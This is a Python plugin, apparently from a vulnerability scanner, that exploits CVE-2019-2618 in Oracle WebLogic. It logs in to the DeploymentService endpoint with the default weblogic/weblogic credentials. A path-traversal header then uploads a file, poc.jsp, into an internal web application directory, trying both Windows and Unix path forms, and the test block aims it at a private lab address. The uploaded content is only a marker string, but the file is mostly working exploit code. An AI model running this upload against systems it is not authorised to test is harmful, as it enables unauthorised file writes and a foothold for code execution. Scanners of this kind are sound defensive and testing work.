#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2019-2618
# updated 2019/10/23
#

import pathlib
import sys
from typing import Any, Tuple

try:
    from utils import PLUGIN_TYPE, plugin, urlutil
except:
    sys.path.append(pathlib.Path(__file__).parent.parent.__str__())
    from utils import PLUGIN_TYPE, plugin, urlutil


class Plugin(plugin.PluginBase):
    def set_info(self):
        return {
            'name': 'Oracle WebLogic Server WLS Core Components Access Control',
            'catalog': 'CVE-2019-2618',
            'itype': PLUGIN_TYPE.MODULE,
            'protocols': ['http', 'https'],
            'port': '7001',
        }

    def run(self, url: urlutil.Url, *args, **kwargs) -> Tuple[bool, Any]:
        '''
        输入url时，如果是这种写法 http://admin:admin@localhost.com/会正确识别账号密码
        '''
        url = url.join('/bea_wls_deployment_internal/DeploymentService')
        headers = {
            'Username': url.username or 'weblogic',
            'Password': url.password or 'weblogic',
            'wl_request_type': 'app_upload',
            'wl_upload_application_name': '\\\\..\\\\tmp\\\\_WL_internal\\\\bea_wls_internal\\\\9j4dqk\\\\war',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW',
        }
        filename = 'poc.jsp'
        data = f'''
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="{filename}"; filename="{filename}"
Content-Type: false

weblogic_test

------WebKitFormBoundary7MA4YWxkTrZu0gW--
'''

        err, response_win = self.http.rq(url.string(), headers=headers, data=data, timeout=5)
        if err:
            return False, err
        headers['wl_upload_application_name'] = '/../tmp/_WL_internal/bea_wls_internal/9j4dqk/war'
        err, response_unx = self.http.rq(url.string(), 'POST', headers=headers, data=data, timeout=5)
        if err:
            return False, err
        return (
            response_win.status_code != 404 or response_unx.status_code != 404,
            response_win.text[:30] if response_win.text else response_unx.text[:30],
        )


if __name__ == '__main__':
    import time

    from utils import net_echo

    nc = net_echo.DnslogCn()
    nc.start_service()
    plugin = Plugin(nc)

    s_time = time.time()
    ret = plugin.do_testing('192.168.245.128')
    print(ret)
    print(ret['is_exists'])
    print('total time(s):', time.time() - s_time)
